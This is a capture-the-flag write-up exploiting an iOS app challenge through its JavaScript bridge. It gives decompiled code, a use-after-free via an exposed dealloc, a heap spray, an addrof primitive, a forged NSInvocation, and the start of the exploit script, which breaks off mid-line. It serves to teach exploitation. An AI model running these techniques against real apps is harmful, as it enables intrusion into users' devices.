    <id>https://kpwnz.github.io/2023/10/23/iOS-Userland-Exploitation-pwn1OS-in-N1CTF/</id>
    <published>2023-10-23T08:55:58.000Z</published>
    <updated>2023-10-23T22:09:22.269Z</updated>
    
    <content type="html"><![CDATA[<h1>From JavaScript to Objective-C: iOS Userland Exploitation, pwn1OS in N1CTF</h1><p>Thank the author for the great challenge. We S1uM4i got the first blood of this challenge and we are the only team that solved it. The challenge is very interesting and I learned a lot from it. I will try to explain the exploitation in detail.</p><h2 id="Analysis">Analysis</h2><p>The application registers a URL Scheme, you can find it in <code>Info.plist</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">key</span>&gt;</span>CFBundleURLSchemes<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">array</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>n1ctf<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br></pre></td></tr></table></figure><p>So we can open the application by opening a URL like <code>n1ctf://aaa/bbb/ccc</code>. The application will parse the URL and do some actions according to the URL.</p><figure class="highlight objc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __cdecl -[SceneDelegate scene:openURLContexts:](SceneDelegate *<span class="keyword">self</span>, SEL a2, <span class="keyword">id</span> a3, <span class="keyword">id</span> a4)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">id</span> v4; <span class="comment">// ST00_8</span></span><br><span class="line">  <span class="keyword">void</span> *v5; <span class="comment">// ST10_8</span></span><br><span class="line">  <span class="keyword">void</span> *v6; <span class="comment">// ST08_8</span></span><br><span class="line">  <span class="keyword">void</span> *v7; <span class="comment">// ST20_8</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v8; <span class="comment">// [xsp+18h] [xbp-58h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [xsp+48h] [xbp-28h]</span></span><br><span class="line">  <span class="keyword">void</span> *v10; <span class="comment">// [xsp+50h] [xbp-20h]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [xsp+58h] [xbp-18h]</span></span><br><span class="line">  SEL v12; <span class="comment">// [xsp+60h] [xbp-10h]</span></span><br><span class="line">  SceneDelegate *v13; <span class="comment">// [xsp+68h] [xbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = a4;</span><br><span class="line">  v13 = <span class="keyword">self</span>;</span><br><span class="line">  v12 = a2;</span><br><span class="line">  v11 = <span class="number">0</span>LL;</span><br><span class="line">  objc_storeStrong();</span><br><span class="line">  v10 = <span class="number">0</span>LL;</span><br><span class="line">  objc_storeStrong();</span><br><span class="line">  objc_msgSend_allObjects(v10, v8, v4);</span><br><span class="line">  v5 = (<span class="keyword">void</span> *)objc_retainAutoreleasedReturnValue();</span><br><span class="line">  objc_msgSend_firstObject(v5, v8);</span><br><span class="line">  v6 = (<span class="keyword">void</span> *)objc_retainAutoreleasedReturnValue();</span><br><span class="line">  objc_msgSend_URL(v6, v8);</span><br><span class="line">  v9 = objc_retainAutoreleasedReturnValue();</span><br><span class="line">  objc_release(v6);</span><br><span class="line">  objc_release(v5);</span><br><span class="line">  objc_msgSend_defaultCenter(&amp;OBJC_CLASS___NSNotificationCenter, v8);</span><br><span class="line">  v7 = (<span class="keyword">void</span> *)objc_retainAutoreleasedReturnValue();</span><br><span class="line">  objc_msgSend_postNotificationName_object_(v7, v8, <span class="built_in">CFSTR</span>(<span class="string">&quot;openWebView&quot;</span>), v9);</span><br><span class="line">  objc_release(v7);</span><br><span class="line">  objc_storeStrong();</span><br><span class="line">  objc_storeStrong();</span><br><span class="line">  objc_storeStrong();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> __cdecl -[ViewController didReceiveNotification:](ViewController *<span class="keyword">self</span>, SEL a2, <span class="keyword">id</span> a3)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">void</span> *v3; <span class="comment">// ST78_8</span></span><br><span class="line">  __int64 v4; <span class="comment">// ST80_8</span></span><br><span class="line">  <span class="keyword">void</span> *v5; <span class="comment">// ST38_8</span></span><br><span class="line">  __int64 v6; <span class="comment">// ST48_8</span></span><br><span class="line">  __int64 v7; <span class="comment">// ST40_8</span></span><br><span class="line">  <span class="keyword">void</span> *v8; <span class="comment">// ST28_8</span></span><br><span class="line">  <span class="keyword">char</span> v9; <span class="comment">// ST34_1</span></span><br><span class="line">  __int64 v10; <span class="comment">// ST10_8</span></span><br><span class="line">  <span class="keyword">void</span> *v11; <span class="comment">// ST18_8</span></span><br><span class="line">  __int64 v12; <span class="comment">// [xsp+58h] [xbp-188h]</span></span><br><span class="line">  __int64 v13; <span class="comment">// [xsp+60h] [xbp-180h]</span></span><br><span class="line">  __int64 v14; <span class="comment">// [xsp+68h] [xbp-178h]</span></span><br><span class="line">  <span class="keyword">void</span> *v15; <span class="comment">// [xsp+70h] [xbp-170h]</span></span><br><span class="line">  <span class="keyword">void</span> *v16; <span class="comment">// [xsp+90h] [xbp-150h]</span></span><br><span class="line">  <span class="keyword">void</span> *v17; <span class="comment">// [xsp+98h] [xbp-148h]</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v18; <span class="comment">// [xsp+A8h] [xbp-138h]</span></span><br><span class="line">  <span class="keyword">void</span> *v19; <span class="comment">// [xsp+B0h] [xbp-130h]</span></span><br><span class="line">  <span class="keyword">char</span> v20; <span class="comment">// [xsp+B8h] [xbp-128h]</span></span><br><span class="line">  __int64 v21; <span class="comment">// [xsp+C0h] [xbp-120h]</span></span><br><span class="line">  __int64 *v22; <span class="comment">// [xsp+C8h] [xbp-118h]</span></span><br><span class="line">  <span class="keyword">void</span> *v23; <span class="comment">// [xsp+F8h] [xbp-E8h]</span></span><br><span class="line">  <span class="keyword">void</span> *v24; <span class="comment">// [xsp+100h] [xbp-E0h]</span></span><br><span class="line">  <span class="keyword">void</span> *v25; <span class="comment">// [xsp+108h] [xbp-D8h]</span></span><br><span class="line">  <span class="keyword">int</span> v26; <span class="comment">// [xsp+114h] [xbp-CCh]</span></span><br><span class="line">  <span class="keyword">void</span> *host; <span class="comment">// [xsp+118h] [xbp-C8h]</span></span><br><span class="line">  <span class="keyword">void</span> *scheme; <span class="comment">// [xsp+120h] [xbp-C0h]</span></span><br><span class="line">  __int128 v29; <span class="comment">// [xsp+128h] [xbp-B8h]</span></span><br><span class="line">  SEL v30; <span class="comment">// [xsp+138h] [xbp-A8h]</span></span><br><span class="line">  ViewController *v31; <span class="comment">// [xsp+140h] [xbp-A0h]</span></span><br><span class="line">  <span class="keyword">char</span> v32; <span class="comment">// [xsp+148h] [xbp-98h]</span></span><br><span class="line"></span><br><span class="line">  v31 = <span class="keyword">self</span>;</span><br><span class="line">  v30 = a2;</span><br><span class="line">  objc_storeStrong();</span><br><span class="line">  objc_msgSend_object(<span class="number">0</span>LL, v18);</span><br><span class="line">  v29 = (<span class="keyword">unsigned</span> __int64)objc_retainAutoreleasedReturnValue();</span><br><span class="line">  objc_msgSend_scheme((<span class="keyword">void</span> *)v29, v18);</span><br><span class="line">  scheme = (<span class="keyword">void</span> *)objc_retainAutoreleasedReturnValue();</span><br><span class="line">  objc_msgSend_host((<span class="keyword">void</span> *)v29, v18);</span><br><span class="line">  host = (<span class="keyword">void</span> *)objc_retainAutoreleasedReturnValue();</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)objc_msgSend_isEqualToString_(scheme, v18, <span class="built_in">CFSTR</span>(<span class="string">&quot;n1ctf&quot;</span>)) &amp; <span class="number">1</span></span><br><span class="line">    &amp;&amp; (<span class="keyword">unsigned</span> __int64)objc_msgSend_isEqualToString_(host, v18, <span class="built_in">CFSTR</span>(<span class="string">&quot;web&quot;</span>)) &amp; <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = (<span class="keyword">void</span> *)objc_alloc(&amp;OBJC_CLASS___NSURLComponents);</span><br><span class="line">    objc_msgSend_absoluteString((<span class="keyword">void</span> *)v29, v18);</span><br><span class="line">    v4 = objc_retainAutoreleasedReturnValue();</span><br><span class="line">    v25 = objc_msgSend_initWithString_(v3, v18);</span><br><span class="line">    objc_release(v4);</span><br><span class="line">    v24 = objc_msgSend_new(&amp;OBJC_CLASS___NSMutableDictionary, v18);</span><br><span class="line">    memset(&amp;v20, <span class="number">0</span>, <span class="number">0x40</span>uLL);</span><br><span class="line">    objc_msgSend_queryItems(v25, v18);</span><br><span class="line">    v16 = (<span class="keyword">void</span> *)objc_retainAutoreleasedReturnValue();</span><br><span class="line">    v17 = objc_msgSend_countByEnumeratingWithState_objects_count_(v16, v18, &amp;v20, &amp;v32, <span class="number">16</span>LL);</span><br><span class="line">    <span class="keyword">if</span> ( v17 )</span><br><span class="line">    &#123;</span><br><span class="line">      v13 = *v22;</span><br><span class="line">      v14 = <span class="number">0</span>LL;</span><br><span class="line">      v15 = v17;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v12 = v14;</span><br><span class="line">        <span class="keyword">if</span> ( *v22 != v13 )</span><br><span class="line">          objc_enumerationMutation(v16);</span><br><span class="line">        v23 = *(<span class="keyword">void</span> **)(v21 + <span class="number">8</span> * v14);</span><br><span class="line">        v5 = v24;</span><br><span class="line">        objc_msgSend_value(v23, v18);</span><br><span class="line">        v6 = objc_retainAutoreleasedReturnValue();</span><br><span class="line">        objc_msgSend_name(v23, v18);</span><br><span class="line">        v7 = objc_retainAutoreleasedReturnValue();</span><br><span class="line">        objc_msgSend_setValue_forKey_(v5, v18, v6);</span><br><span class="line">        objc_release(v7);</span><br><span class="line">        objc_release(v6);</span><br><span class="line">        ++v14;</span><br><span class="line">        <span class="keyword">if</span> ( v12 + <span class="number">1</span> &gt;= (<span class="keyword">unsigned</span> __int64)v15 )</span><br><span class="line">        &#123;</span><br><span class="line">          v14 = <span class="number">0</span>LL;</span><br><span class="line">          v15 = objc_msgSend_countByEnumeratingWithState_objects_count_(v16, v18, &amp;v20, &amp;v32, <span class="number">16</span>LL);</span><br><span class="line">          <span class="keyword">if</span> ( !v15 )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    objc_release(v16);</span><br><span class="line">    objc_msgSend_allKeys(v24, v18);</span><br><span class="line">    v8 = (<span class="keyword">void</span> *)objc_retainAutoreleasedReturnValue();</span><br><span class="line">    v9 = (<span class="keyword">unsigned</span> __int64)objc_msgSend_containsObject_(v8, v18, <span class="built_in">CFSTR</span>(<span class="string">&quot;url&quot;</span>));</span><br><span class="line">    objc_release(v8);</span><br><span class="line">    <span class="keyword">if</span> ( v9 &amp; <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v19 = objc_msgSend_new(&amp;OBJC_CLASS___WebViewController, v18);</span><br><span class="line">      objc_msgSend_objectForKeyedSubscript_(v24, v18, <span class="built_in">CFSTR</span>(<span class="string">&quot;url&quot;</span>));</span><br><span class="line">      v10 = objc_retainAutoreleasedReturnValue();</span><br><span class="line">      objc_msgSend_setUrlString_(v19, v18);</span><br><span class="line">      objc_release(v10);</span><br><span class="line">      objc_msgSend_navigationController(v31, v18);</span><br><span class="line">      v11 = (<span class="keyword">void</span> *)objc_retainAutoreleasedReturnValue();</span><br><span class="line">      objc_msgSend_pushViewController_animated_(v11, v18, v19, <span class="number">1</span>LL);</span><br><span class="line">      objc_release(v11);</span><br><span class="line">      objc_storeStrong();</span><br><span class="line">    &#125;</span><br><span class="line">    objc_storeStrong();</span><br><span class="line">    objc_storeStrong();</span><br><span class="line">    v26 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v26 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  objc_storeStrong();</span><br><span class="line">  objc_storeStrong();</span><br><span class="line">  objc_storeStrong();</span><br><span class="line">  objc_storeStrong();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Then do a classical class dump first</p><figure class="highlight objc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">@interface</span> <span class="title">ScriptInterface</span> : <span class="title">NSObject</span></span></span><br><span class="line"><span class="keyword">@end</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">@interface</span> <span class="title">CoreService</span> : <span class="title">ScriptInterface</span></span></span><br><span class="line"><span class="keyword">@end</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">@interface</span> <span class="title">N1CTFIntroduction</span> : <span class="title">ScriptInterface</span></span></span><br><span class="line"><span class="keyword">@end</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">@interface</span> <span class="title">HTTRequest</span> : <span class="title">ScriptInterface</span></span></span><br><span class="line"><span class="keyword">@end</span></span><br></pre></td></tr></table></figure><p>And an instance of <code>ScriptInterface</code> is explosed to the context of JavaScript</p><figure class="highlight objc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v11 = objc_msgSend_new(&amp;OBJC_CLASS___ScriptInterface, v18);</span><br><span class="line">objc_msgSend_setValue_forKey_(v10, v18);</span><br><span class="line">objc_release(v11);</span><br></pre></td></tr></table></figure><p>All these are the subclass of <code>ScriptInterface</code>. So we can call their methods in the context of JavaScript.</p><p>Also</p><figure class="highlight objc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+ (_Bool)isSelectorExcludedFromWebScript:(SEL)arg1;</span><br></pre></td></tr></table></figure><p>always returns <code>NO</code>, which means all the methods are exposed to JavaScript. Considering the following code:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = n1ctf.$makeCoreService();</span><br><span class="line"><span class="built_in">window</span>.a = a;</span><br><span class="line">a.dealloc();</span><br></pre></td></tr></table></figure><p>We can see that the <code>dealloc</code> method is exposed to JavaScript. So we can call <code>dealloc</code> on any object to free it. This is a very powerful primitive that let us use after free any <code>ScriptInterface</code> and subclass object.</p><p>In <code>-[CoreService dealloc]</code>, it will call <code>-[NSInvocation invoke]</code> on its property <code>@property NSInvocation * cancelRequest;</code>. So we can craft a fake <code>NSInvocation</code> object to call any method on any object. For example, <code>+[BackDoor getFlag:]</code>. (Actually in a challenge designed by me for my undergraduate school’s CTF, there is a similar technique, e.g. using <code>NSInvocation</code> to call arbitrary C functions`)</p><p>To build up the <code>addrof()</code> primitive, we can make use of the error message when calling a non-exist method on and object. I took the implementation from CodeColorist’s writeup for CVE-2021-1748</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// copy from CVE-2021-1784</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addrof</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">    n1ctf.$setChallenge_(obj)</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        n1ctf.$challenge()</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="built_in">console</span>.debug(e)</span><br><span class="line">        <span class="keyword">const</span> match = <span class="regexp">/instance (0x[\da-f]+)$/i</span>.exec(e)</span><br><span class="line">        <span class="keyword">if</span> (match) <span class="keyword">return</span> match[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;Failed&#x27;</span>)</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Another challenge is how to do the heap spray. Luckily we have a method</p><figure class="highlight objc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">@interface</span> <span class="title">HTTRequest</span> : <span class="title">ScriptInterface</span></span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">NSData</span> *_data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">- (<span class="keyword">void</span>).cxx_destruct;</span><br><span class="line"><span class="keyword">@property</span>(<span class="keyword">retain</span>, <span class="keyword">nonatomic</span>) <span class="built_in">NSData</span> *data; <span class="comment">// @synthesize data=_data;</span></span><br><span class="line">- (<span class="keyword">void</span>)describeObject:(<span class="keyword">id</span>)arg1:(<span class="keyword">id</span>)arg2;</span><br><span class="line">- (<span class="keyword">void</span>)addMultiPartData:(<span class="keyword">id</span>)arg1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@end</span></span><br></pre></td></tr></table></figure><p><code>-[HTTRequest addMultiPartData:]</code> takes a base64 encoded string as input, and decodes it to store in <code>NSData *_data</code>. So we can use this method to do heap spray.</p><h2 id="Exploit">Exploit</h2><p>So the exploitation looks like this:</p><ul><li>Free a <code>CoreService</code> object</li><li>Reallocate it and perform a type confusion, convert it to a <code>NSConcreteData</code> object to do memory disclosure</li><li>Leak dyld_shared_cache, pwn1OS base address, tagged <code>NSMethodSignature</code> address and <code>cookie</code></li><li>Set up the arguments for <code>+[BackDoor getFlag:]</code></li><li>Craft fake <code>NSInvocation</code> object to call <code>+[BackDoor getFlag:]</code></li></ul><h2 id="Script">Script</h2><p>I have no idea about how to write elegant JavaScript so don’t blame me.<br>The full payload generated script is here:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">String</span>.prototype.toDataURI = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;data:text/html;,&#x27;</span> + <span class="built_in">encodeURIComponent</span>(<span class="built_in">this</span>).replace(<span class="regexp">/[!&#x27;()*]/g</span>, <span class="built_in">escape</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">0x2834c99a0: 0x02000001f9e2a699 0x0000000102c29f20 &lt;- isa, frame:0x0000000102c29f20 -&gt; [target, selector, arguments]</span></span><br><span class="line"><span class="comment">0x2834c99b0: 0x0000000102c29de0 0xbd0461d930d9b4a7 &lt;- retdata, signature</span></span><br><span class="line"><span class="comment">0x2834c99c0: 0x0000000000000000 0x0000000000000000 &lt;- wtf, 0</span></span><br><span class="line"><span class="comment">0x2834c99d0: 0x00000002819a39f0 0x00000001e60e9a43 &lt;- target, selector</span></span><br><span class="line"><span class="comment">0x2834c99e0: 0x00000000a50e01d3 0x0000000000000000 &lt;- _magic_cookie.ovalue, 0</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">payload</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">hexToBase64</span>(<span class="params">hexstring</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> btoa(hexstring.match(<span class="regexp">/\w&#123;2&#125;/g</span>).map(<span class="function"><span class="keyword">function</span> (<span class="params">a</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">String</span>.fromCharCode(<span class="built_in">parseInt</span>(a, <span class="number">16</span>));</span><br><span class="line">        &#125;).join(<span class="string">&quot;&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">p64</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// data is a number</span></span><br><span class="line">        data = <span class="built_in">BigInt</span>(data)</span><br><span class="line">        str_data = data.toString(<span class="number">16</span>);</span><br><span class="line">        <span class="comment">// pad to 8 bytes</span></span><br><span class="line">        str_data = str_data.padStart(<span class="number">16</span>, <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">        <span class="comment">// reverse bytes order</span></span><br><span class="line">        str_data = str_data.match(<span class="regexp">/\w&#123;2&#125;/g</span>).reverse().join(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> str_data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> offsets = &#123;</span><br><span class="line">        <span class="comment">// remember to change all of this!</span></span><br><span class="line">        <span 